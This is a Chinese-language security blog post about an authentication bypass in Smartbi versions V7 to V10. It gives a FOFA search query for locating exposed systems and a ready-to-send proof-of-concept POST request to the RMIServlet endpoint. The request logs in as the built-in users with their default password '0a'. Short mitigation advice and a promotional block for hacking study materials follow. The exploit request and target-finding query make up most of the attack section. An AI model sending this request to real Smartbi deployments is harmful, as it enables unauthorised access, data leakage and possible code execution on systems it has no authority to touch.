# 原创
：  实战|Smartbi---意外的福利

# 实战|Smartbi---意外的福利

##### 漏洞描述

Smartbi在安装时会内置几个用户，在使用特定接口时，可绕过用户身份认证机制获取其身份凭证，随后可使用获取的身份凭证调用后台接口，可能导致敏感信息泄露和代码执行。

##### 影响版本

V7 &lt;= Smartbi &lt;= V10

##### fofa语法

FOFA：app=”SMARTBI”

##### 漏洞复现

`http://ip/smartbi/vision/RMIServlet`<br/>  

<br/> 出现以上页面则表示代码存在

##### 构造poc

```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: ip
Content-Type: application/x-www-form-urlencoded


className=UserService&amp;methodName=loginFromDB&amp;params=["system","0a"]

```

请求体中传入的三个参数

className：必须指定UserService类名methodName：该类调用的方法loginFromDB

params：其中的第一个参数是内置的三个用户名（public、service、system）可随机构造，第二个参数是三个账号默认的密文密码(默认值为0a)<br/> 这里就涉及到代码审计的内容，附上链接<br/> https://exp.ci/2023/06/17/Smartbi-%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/

将构造好的数据包放出然后刷新页面即可登录

你以为这就完了，怎么可能呢，来上福利

<br/> 然后我就在测试的时候遇上她，那一刻我的心是灰暗的，是破碎的，到嘴的鸭子就那么飞了，但是身为愣头青的我怎么可能就这么放弃呢，比较特征还是有的，于是就发现了一个新的漏洞。上图。

正如你所见，那个系统日志是可以下载的，理所当然的是个高危，但是至于如何产生的就不得而知了，不确定是否是在环境搭建的时候，某些配置或环境冲突导致的。尝试重装后无法复现。但是个人觉得有一定的借鉴价值。

##### 修复建议

临时缓解方案<br/> 在确认不影响业务的前提下，删除内置的几个账号（public、service、system）。同时如非必要，不要将Smartbi系统开放在互联网上。

升级修复方案<br/> 官方已发布升级补丁包，支持在线升级和离线补丁安装

**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5461750e57024e0db15ba28d8996e718.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/bef67fdf066e4afd96231b1d94e9baf8.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/64373cbfb5b4420892722d7069633c73.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/51e0dc6d7c2e4684af5f282e14eac6c2.png" width="665"/>

应急响应笔记

学习路线
